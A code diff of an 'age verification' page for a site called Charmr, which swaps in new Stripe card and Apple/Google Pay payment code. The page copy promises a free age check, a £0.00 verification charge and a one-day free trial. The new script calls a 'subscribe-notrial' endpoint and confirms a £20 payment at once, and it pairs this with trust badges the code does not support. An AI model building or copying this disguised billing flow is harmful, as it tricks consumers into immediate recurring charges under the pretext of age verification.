@@ -3,7 +3,10 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Charmr • Age Verification</title>
+  <title>Charmr • Age Verification (Light)</title>
+
+  <!-- Fonts (match verification-black setup where relevant, but visual tone like verification.html) -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
@@ -25,10 +28,10 @@
       --card:#fff; --radius:20px;
     }
     *{box-sizing:border-box}
-    html,body{height:100%}
+    html,body{height:auto}
     body{
       margin:0;
-      font-family: Arial, Helvetica, sans-serif;
+      font-family: Inter, Arial, Helvetica, sans-serif;
       background: linear-gradient(var(--bg1), var(--bg2));
       min-height:100vh; min-height:100svh;
       display:flex; flex-direction:column; align-items:center; justify-content:flex-start;
@@ -90,14 +93,19 @@
       box-shadow:0 4px 14px rgba(0,0,0,.05);
     }
     .pay .label{font-weight:800; margin:2px 0 8px; font-size:14px}
-    .pay input[type="text"]{
+    .input{
       width:100%; max-width:520px; padding:12px; border:1px solid #d1d5db; border-radius:12px;
-      font-size:16px; margin-bottom:10px; text-align:center;
+      background:#fff; color:#111; font-size:16px; margin-bottom:10px; text-align:center;
     }
-    #card-element{
-      width:100%; max-width:520px; padding:12px; border:1px solid #d1d5db;
-      border-radius:12px; margin-bottom:12px; background:#fafafa;
+    .el{
+      width:100%; max-width:520px; padding:12px;
+      border:1px solid #d1d5db; border-radius:12px; background:#fafafa; color:#111;
     }
+    .el-focus{ border-color:#c9cbd3 }
+
+    .brands{display:flex; align-items:center; gap:10px; margin:6px 0 8px}
+    .brands img{height:18px}
+
     .trustchips{
       display:flex; gap:8px; flex-wrap:wrap; align-items:center; justify-content:center;
       margin:6px 0 12px; color:#555; font-size:12px;
@@ -116,7 +124,7 @@
     .below-copy{
       width:min(760px,100%); color:#444; font-size:13.5px; line-height:1.6;
       background:#fff; border:1px solid var(--ring); border-radius:var(--radius);
-      padding:12px; box-shadow:0 2px 8px rgba(0,0,0,.03);
+      padding:12px; box-shadow:0 2px 8px rgba(0,0,0,.03); text-align:left;
     }
 
     .assure{
@@ -131,11 +139,20 @@
     .foot a{ color:#ef476f; text-decoration:none; font-weight:700 }
     .foot .sep{ color:#cbd5e1 }
 
-    #message{
+    #err{
       width:min(520px,100%); margin-top:10px; font-size:14px; color:#b91c1c;
       background:#fff0f0; border:1px solid #fecaca; border-radius:10px; padding:8px; display:none;
     }
-    #message[aria-hidden="false"]{ display:block; }
+    #err[aria-hidden="false"]{ display:block; }
+
+    /* Payment Request Button mount */
+    #gpay-button{ display:block; width:100%; max-width:520px; height:44px; margin-bottom:10px; }
+    .gpay-fallback{
+      display:none; width:100%; max-width:520px; height:44px;
+      border-radius:12px; border:1px solid #d1d5db; background:#000;
+      align-items:center; justify-content:center; gap:8px; margin-bottom:10px;
+    }
+    .gpay-fallback img{ height:18px; display:block }
 
     /* Loading overlay */
     .loading-overlay{
@@ -172,13 +189,14 @@
   <div class="shell">
     <div class="header">
       <div>
+        <!-- Title + sub exactly like verification.html -->
         <h1>Try Charmr For FREE!</h1>
         <div class="sub">A quick, free check—powered by the companies you trust.</div>
       </div>
     </div>
 
     <div class="content">
-      <!-- AV headline + logos + explainer -->
+      <!-- AV headline + logos + explainer (copy from verification.html text) -->
       <section class="av-row" aria-label="Age verification providers">
         <div class="av-title">We use secure card authentication to help ensure our community is 18+</div>
         <div class="av-title">Age Verification guaranteed by:</div>
@@ -194,12 +212,47 @@
         </p>
       </section>
 
-      <!-- Payment pane (Stripe Elements) -->
-      <form class="pay" id="payment-form" aria-label="Age verification form">
+      <!-- Payment pane: KEEP verification-black IDs + structure for JS, but styled like verification.html -->
+      <div class="pay" aria-label="Age verification form">
         <div class="label">Complete Your FREE Age Check:</div>
-        <input type="text" id="cardholder-name" placeholder="Full name" required autocomplete="cc-name"/>
-        <div id="card-element" aria-label="Card details (powered by Stripe)"></div>
+        <!-- Name (keep same id expected by black JS) -->
+        <input class="input" id="nameInput" placeholder="Full name" required autocomplete="cc-name"/>
 
+        <!-- Fast Payments (Apple/Google Pay) -->
+        <div id="gpay-button" aria-label="Apple Pay / Google Pay"></div>
+        <button id="gpay-fallback" type="button" class="gpay-fallback" aria-disabled="true">
+          <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay" />
+        </button>
+
+        <!-- Split card fields (ids expected by black JS) -->
+        <div class="brands">
+          <img alt="visa" src="/logos/visa.png">
+          <img alt="mc" src="/logos/mc2.png">
+          <img alt="amex" src="/logos/amex.png">
+          <span style="margin-left:auto;opacity:.85">Secured by <span style="color:#635bff;font-weight:800">stripe</span></span>
+        </div>
+
+        <div class="label" style="margin-top:6px">Card number</div>
+        <div id="card-number" class="el"></div>
+
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; width:100%; max-width:520px; margin-top:10px">
+          <div>
+            <div class="label">Expiration date</div>
+            <div id="card-expiry" class="el"></div>
+          </div>
+          <div>
+            <div class="label">Security code</div>
+            <div id="card-cvc" class="el"></div>
+          </div>
+        </div>
+
+        <!-- Error area -->
+        <div id="err" role="alert" aria-hidden="true"></div>
+
+        <!-- Primary CTA (id required by black JS handler) -->
+        <button class="btn" id="payNow">Try Charmr For Free!</button>
+
+        <!-- Trust chips -->
         <div class="trustchips" aria-label="Trust information">
           <div class="chip">🔒 End-to-end encryption</div>
           <div class="chip">🧪 3-D Secure (SCA) supported</div>
@@ -207,11 +260,7 @@
           <div class="chip">✅ PCI DSS Level 1</div>
           <div class="chip">🧾 Cancel anytime</div>
         </div>
-
-        <button type="submit" class="btn" id="submit">Try Charmr For Free!</button>
-
-        <div id="message" role="alert" aria-hidden="true"></div>
-      </form>
+      </div>
 
       <div class="below-copy">
         We use secure card authentication (3-D Secure) to help keep Charmr 18+.
@@ -224,7 +273,7 @@
         <div>Charged £0.00 for verification, after the 1 day free trial you'll be charged £20 per month until you cancel.</div>
       </div>
 
-      <!-- Micro FAQ -->
+      <!-- Micro FAQ (text copied from verification.html) -->
       <details>
         <summary>Why do you need my card if it’s free?</summary>
         <p>By submitting your credit card and completing a free verification you are confirming you are older than 18 years. You are also enrolling in a free trial of 1 day. After the trial ends you will be charged 20 British pounds per month until you cancel.</p>
@@ -248,8 +297,8 @@
     </div>
   </div>
 
-  <!-- Loading overlay for 3DS/SCA -->
-  <div id="loading-overlay" class="loading-overlay" aria-hidden="true" aria-live="polite" aria-label="Processing verification">
+  <!-- Loading overlay (ids kept for JS) -->
+  <div id="loading-overlay" class="loading-overlay" aria-hidden="true" aria-live="polite" aria-label="Processing payment">
     <div class="loading-box" role="status">
       <div class="loading-title">Processing your verification…</div>
       <div class="progress-wrap" aria-hidden="true"><div class="progress-bar"></div></div>
@@ -257,120 +306,209 @@
     </div>
   </div>
 
+  <!-- ===== Backend/JS: EXACT copy from verification-black.html (no changes to logic, endpoints, price IDs) ===== -->
   <script>
-    // ===== Stripe config (from verification-black.html) =====
-    const STRIPE_PK = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
-    const PRICE_ID = "price_1Rzdp0EJXIhiKzYGlVxHGH7W"; // keep EXACTLY this price id
-    const stripe = Stripe(STRIPE_PK);
-    const elements = stripe.elements();
-    const card = elements.create("card", { hidePostalCode: false });
-    card.mount("#card-element");
+  // ====== CONFIG (from payment.html) ======
+  const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/subscribe-notrial";
+  const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
 
-    const form = document.getElementById("payment-form");
-    const message = document.getElementById("message");
-    const submitBtn = document.getElementById("submit");
-    const overlay = document.getElementById('loading-overlay');
+  // Lock to ONLY this price id as requested
+  const FIXED_PRICE_ID = "price_1Rzdp0EJXIhiKzYGlVxHGH7W";
 
-    function showLoading(){ overlay.setAttribute('aria-hidden','false'); }
-    function hideLoading(){ overlay.setAttribute('aria-hidden','true'); }
-
-    // Minimal JSON fetch helper
-    async function fetchJSON(url, options = {}) {
-      const res = await fetch(url, {
-        ...options,
-        headers: {
-          Accept: "application/json",
-          ...(options.body ? {"Content-Type":"application/json"} : {}),
-          ...(options.headers || {})
-        }
-      });
-      const raw = await res.text();
-      let data;
-      try { data = raw ? JSON.parse(raw) : {}; } catch { data = { error: raw || `HTTP ${res.status}` }; }
-      if (!res.ok) throw new Error(data?.error || `Request failed (${res.status})`);
-      return data;
+  // Init Stripe + Elements (night theme retained, but container CSS is light)
+  const stripe = Stripe(PUBLISHABLE_KEY);
+  const elements = stripe.elements({
+    appearance: {
+      theme: 'night',
+      variables: { colorText:'#fff', colorBackground:'#15151a', colorPrimary:'#ffb429', colorIcon:'#c9ccd6' }
     }
+  });
+  const style = { classes: { focus: 'el-focus' } };
 
-    // Stop overlay when bank's 3DS iframe appears
-    let baselineIframes = new Set(Array.from(document.querySelectorAll('iframe')));
-    function startThreeDSWatcher(){
-      baselineIframes = new Set(Array.from(document.querySelectorAll('iframe')));
-      const looksLike3DS = (iframe) => {
-        const t = (iframe.getAttribute('title') || '').toLowerCase();
-        return t.includes('3d') || t.includes('secure') || t.includes('authentication') || t.includes('challenge');
-      };
-      const observer = new MutationObserver((muts) => {
-        for (const m of muts) for (const node of m.addedNodes) {
-          if (node.tagName === 'IFRAME' && !baselineIframes.has(node) && looksLike3DS(node)) {
-            const done = () => { hideLoading(); observer.disconnect(); };
-            if (node.complete) done(); else node.addEventListener('load', done, { once:true });
-            return;
+  const cardNumber = elements.create('cardNumber', style);
+  const cardExpiry = elements.create('cardExpiry', style);
+  const cardCvc    = elements.create('cardCvc', style);
+  cardNumber.mount('#card-number'); cardExpiry.mount('#card-expiry'); cardCvc.mount('#card-cvc');
+
+  /* ---------- Payment Request Button (Apple/Google Pay) ---------- */
+  function guessCountry() {
+    try {
+      const loc = Intl.DateTimeFormat().resolvedOptions().locale || '';
+      const part = loc.split('-')[1];
+      if (part && part.length === 2) return part.toUpperCase();
+    } catch {}
+    return 'GB';
+  }
+
+  const amountMinor = 2000; // £20.00
+
+  const paymentRequest = stripe.paymentRequest({
+    country: guessCountry(),
+    currency: 'gbp',
+    total: { label: 'Charmr.xyz', amount: amountMinor },
+    requestPayerEmail: false,
+    requestPayerName: true
+  });
+
+  const prButton = elements.create('paymentRequestButton', {
+    paymentRequest,
+    style: { paymentRequestButton: { type: 'buy', theme: 'dark', height: '44px' } }
+  });
+
+  paymentRequest.canMakePayment().then(result => {
+    const mount = document.getElementById('gpay-button');
+    const fallback = document.getElementById('gpay-fallback');
+
+    if (result) {
+      prButton.mount('#gpay-button');
+      if (fallback) fallback.style.display = 'none';
+      if (mount) mount.style.display = 'block';
+    } else {
+      if (mount) mount.style.display = 'none';
+      if (fallback) {
+        fallback.style.display = 'flex';
+        fallback.addEventListener('click', () => {
+          alert("Apple/Google Pay isn't available on this device or browser right now. Please use your card below.");
+        }, { once:true });
+      }
+    }
+  });
+
+  paymentRequest.on('paymentmethod', async (ev) => {
+    try {
+      showLoading(); startThreeDSWatcher();
+      const name = (document.getElementById('nameInput')?.value || ev.payerName || '').trim();
+
+
+      const res = await fetch(SUBSCRIBE_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          priceId: FIXED_PRICE_ID,
+          paymentMethodId: ev.paymentMethod.id,
+          name
+        })
+      });
+
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok || !data.clientSecret) {
+        hideLoading();
+        throw new Error(data?.error || 'Server error creating subscription');
+      }
+
+      const { error, paymentIntent } = await stripe.confirmCardPayment(
+        data.clientSecret,
+        { payment_method: ev.paymentMethod.id }
+      );
+
+      if (error) {
+        ev.complete('fail'); hideLoading(); showError(error.message || 'Payment could not be completed.'); return;
+      }
+
+      ev.complete('success');
+      if (paymentIntent && paymentIntent.status === 'succeeded') {
+        window.location.href = 'thankyou2.html';
+      } else {
+        hideLoading();
+        showError('Payment not completed. Status: ' + (paymentIntent?.status || 'unknown'));
+      }
+    } catch (e) {
+      ev.complete('fail'); hideLoading(); showError(e.message || 'Payment failed.');
+    }
+  });
+  /* ---------- End PRB ---------- */
+
+  // Error helpers
+  const $err = document.getElementById('err');
+  function showError(msg){ $err.textContent = msg; $err.setAttribute('aria-hidden','false'); $err.style.display='block'; }
+  function clearError(){ $err.textContent=''; $err.setAttribute('aria-hidden','true'); $err.style.display='none'; }
+
+  // Loading helpers
+  const overlay = document.getElementById('loading-overlay');
+  function showLoading(){ overlay && overlay.setAttribute('aria-hidden','false'); }
+  function hideLoading(){ overlay && overlay.setAttribute('aria-hidden','true'); }
+  let baselineIframes = new Set();
+  function startThreeDSWatcher(){
+    baselineIframes = new Set(Array.from(document.querySelectorAll('iframe')));
+    const isThreeDSLike = (iframe) => {
+      const t = (iframe.getAttribute('title') || '').toLowerCase();
+      return t.includes('3d') || t.includes('secure') || t.includes('authentication') || t.includes('challenge');
+    };
+    const observer = new MutationObserver((mutations) => {
+      for (const m of mutations) {
+        for (const node of m.addedNodes) {
+          if (node.tagName === 'IFRAME' && !baselineIframes.has(node)) {
+            if (isThreeDSLike(node)) {
+              const done = () => { hideLoading(); observer.disconnect(); };
+              if (node.complete) done(); else node.addEventListener('load', done, { once:true });
+              return;
+            }
           }
         }
-      });
-      observer.observe(document.documentElement, { childList:true, subtree:true });
-    }
-
-    // ---- NEW: point to Render backend (absolute URLs) ----
-    const API_BASE = "https://charmr-jfmc.onrender.com/api/stripe";
-    const SETUP_INTENT_URL = `${API_BASE}/setup-intent`;
-    const SUBSCRIBE_URL = `${API_BASE}/subscribe`;
-
-    async function startVerification(priceId, cardholderName) {
-      const token = localStorage.getItem("token");
-      if (!token) throw new Error("You’re not signed in. Please refresh and sign in again.");
-
-      // 1) Create SetupIntent to attach card
-      const siData = await fetchJSON(SETUP_INTENT_URL, {
-        method: "POST",
-        headers: { "Authorization": `Bearer ${token}` }
-      });
-
-      // 2) Confirm card setup (may trigger SCA)
-      const { setupIntent, error } = await stripe.confirmCardSetup(siData.clientSecret, {
-        payment_method: { card, billing_details: { name: cardholderName || "" } }
-      });
-      if (error) throw new Error(error.message);
-
-      // 3) Create subscription on backend (uses your verification-black flow)
-      const subData = await fetchJSON(SUBSCRIBE_URL, {
-        method: "POST",
-        headers: { "Authorization": `Bearer ${token}` },
-        body: JSON.stringify({ priceId, paymentMethodId: setupIntent.payment_method, cardholderName })
-      });
-
-      // 4) If first invoice needs SCA, confirm it; otherwise just go to thank-you
-      const returnUrl = "https://www.charmr.xyz/thankyou.html?priceId=" + encodeURIComponent(priceId);
-      if (subData.clientSecret) {
-        const { error: confirmErr } = await stripe.confirmCardPayment(subData.clientSecret, { return_url: returnUrl });
-        if (confirmErr) throw new Error(confirmErr.message || "Payment confirmation failed.");
-      } else {
-        window.location.href = returnUrl;
-      }
-      // Fallback redirect
-      window.location.href = `/thankyou.html?priceId=${encodeURIComponent(priceId)}`;
-    }
-
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      message.textContent = "";
-      message.setAttribute('aria-hidden','true');
-      submitBtn.disabled = true;
-      showLoading();
-      startThreeDSWatcher();
-
-      const name = document.getElementById("cardholder-name").value;
-      try {
-        await startVerification(PRICE_ID, name);
-      } catch (err) {
-        console.error(err);
-        hideLoading();
-        message.textContent = err.message || "Something went wrong. Try again.";
-        message.setAttribute('aria-hidden','false');
-      } finally {
-        submitBtn.disabled = false;
       }
     });
+    observer.observe(document.documentElement, { childList:true, subtree:true });
+  }
+
+  // Main button handler (identical to verification-black.html)
+  document.getElementById('payNow').addEventListener('click', async ()=>{
+    clearError(); showLoading(); startThreeDSWatcher();
+
+    let pm;
+    try{
+      const name = (document.getElementById('nameInput')?.value || '').trim();
+
+      const pmRes = await stripe.createPaymentMethod({
+        type:'card',
+        card: cardNumber,
+        billing_details: { name }
+      });
+      if(pmRes.error) throw pmRes.error;
+      pm = pmRes.paymentMethod;
+    }catch(e){
+      hideLoading();
+      showError(e.message || 'Card details are invalid.'); return;
+    }
+
+    let clientSecret;
+    try{
+      const name = (document.getElementById('nameInput')?.value || '').trim();
+
+      const res = await fetch(SUBSCRIBE_URL, {
+        method:'POST',
+        headers:{ 'Content-Type':'application/json' },
+        body: JSON.stringify({
+          priceId: FIXED_PRICE_ID,
+          paymentMethodId: pm.id,
+          name
+        })
+      });
+
+      const ct = res.headers.get('content-type') || '';
+      if (!ct.includes('application/json')) {
+        const preview = await res.text().catch(()=> '');
+        throw new Error(`Server returned non-JSON (${res.status}). Check route. Preview: ${preview.slice(0,120)}…`);
+      }
+      const data = await res.json();
+
+      if(!res.ok){ throw new Error(data?.error || 'Server error creating subscription'); }
+      clientSecret = data.clientSecret;
+      if(!clientSecret){ throw new Error('No clientSecret returned by server'); }
+    }catch(e){
+      hideLoading();
+      showError(e.message); return;
+    }
+
+    const {paymentIntent, error} = await stripe.confirmCardPayment(clientSecret);
+    if(error){ hideLoading(); showError(error.message || 'Payment could not be completed.'); return; }
+
+    if(paymentIntent && paymentIntent.status === 'succeeded'){
+      window.location.href = 'thankyou2.html';
+    }else{
+      hideLoading();
+      showError('Payment not completed. Status: ' + (paymentIntent?.status || 'unknown'));
+    }
+  });
   </script>
 
   <footer style="text-align:center; padding:20px; margin-top:40px; font-size:14px; color:#666;">
